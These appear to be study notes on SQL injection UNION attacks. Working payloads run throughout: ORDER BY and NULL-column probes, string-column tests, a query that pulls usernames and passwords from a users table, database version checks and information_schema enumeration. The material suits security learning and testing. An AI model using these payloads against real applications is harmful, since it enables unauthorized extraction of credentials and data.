# SQLi UNION attacks
* Same Number of Columns: 
  * The original query and the injected query must return the same number of columns. If the original query returns, for example, three columns, your injected query should also produce three columns.
* Compatible Data Types:
  * The data types of corresponding columns in the original and injected queries must be compatible. This ensures that the data from both queries can be successfully combined. For instance, if a column in the original query has text data, the corresponding column in the injected query should also have text data.
# How to determine the number of columns?
1. Inject an **ORDER BY** clause with different numeric values (column indices) until an error occurs.
   * Example: \
   `' ORDER BY 1-- ` \
   `' ORDER BY 2--`, etc. \
  Output: `The ORDER BY position number 3 is out of range of the number of items in the selected list`
2.  Employ a series of **UNION SELECT** payloads with varying numbers of null values to identify the correct number of columns in the result set.
    * Example: \
    `' UNION SELECT NULL --` \
    `' UNION SELECT NULL, NULL--`, etc. \
    Output: `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`
    * The use of NULL values in the injected **SELECT** query is strategic. It ensures compatibility with various data types, maximizing the chances of success when the column count is correct. 
    * However, the application's response may vary, In case of nulls matches the number of columns, the database returns an additional row in the result set with null values in each column.
* **NOTE**: In the context of Oracle databases, it is a requirement that every **SELECT** query includes the **FROM** keyword and specifies a valid table. Fortunately, Oracle provides a built-in table called **dual**, which serves this purpose. Therefore, injected queris on Oracle db typically take the following form: \
` UNION SELECT NULL FROM DUAL--` \
Also it's important to note that on MySQL databases, the `--` comment sequence must be followed by a space. Alternatively, the `#` character can be used to identify a comment.
# How to identify columns in the original query that can hold string data?
#### Once the number of required columns is determined, each column is probed by submitting `UNION SELECT` payloads with string values.
* Example: If the original query returns four columns, \
`' UNION SELECT  'g', NULL, NULL, NULL--` \
`' UNION SELECT  NULL, 'g', NULL, NULL--` \
`' UNION SELECT  NULL, NULL, 'g', NULL--` \
`' UNION SELECT  NULL, NULL, NULL, 'g'--` 
* If a database error occurs, such as conversion error, it means that the column's data type is not compatible with string data.
# String concatenation
#### When a query only returns a single column, it's possible to retrieve multiple values by concatenating them together and even include a separator to distinguish the combined values
* Example: On postgres we could submit the following input \
`UNION SELECT username ||'~'|| password FROM users`
* Output : `admin~~1337`
#### The double-pipe sequence `||` is a string concatenation operator on Oracle and other databases and the '~' char is used to separate the data.
# Querying the database type and version
#### To potentially identify the database type and version, we can inject provider-specific queries to check their compatibility and determine if any of them yield results.
* Queries to determine the database version on different database types:
  *  Oracle: ` SELECT * from v$version`
  * PostgresSQL: ` SELECT version()`
  * Microsoft, MySQL: `SELECT @@version`
* Example: On MySQL \
` UNION SELECT @@version--` \
* Output: `8.0.36.0ubuntu0.20.04.1`
# Listing the contents of the database
#### In the realm of databases, many types (with the exception of Oracle) feature a collection of views known as the information schema. This schema serves as a valuable resource for retrieving details about the structure of the database.
* Example: For instance, one can use the following query to obtain a list of tables within the database 
  * `SELECT * FROM information_schema.tables`
* To delve deeper into the structure of individual tables, one can query `information_schema.columns` , specifying the desired table .
  * Example: `SELECT * FROM information_schema.columns WHERE table_name='Users'`


